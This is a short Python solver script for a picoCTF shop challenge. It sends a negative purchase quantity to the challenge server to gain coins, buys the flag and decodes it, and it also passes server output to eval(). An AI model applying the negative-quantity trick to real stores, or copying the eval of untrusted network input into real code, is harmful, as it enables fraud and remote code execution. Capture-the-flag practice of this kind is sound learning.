from ptrlib import *

sock = Socket('mercury.picoctf.net', 34938)
sock.sendlineafter(b'Choose an option:', b'0')
# you will have 100 coins by buying -6 Quiches
sock.sendlineafter(b'How many do you want to buy?', b'-6')
sock.sendlineafter(b'Choose an option:', b'2')
sock.sendlineafter(b'How many do you want to buy?', b'1')
sock.recvuntil('Flag is:  ')
s = sock.recv(1024).decode()
a = eval(s.replace(' ', ','))
flag = ''
for c in a:
    flag += chr(int(c))

print(flag)
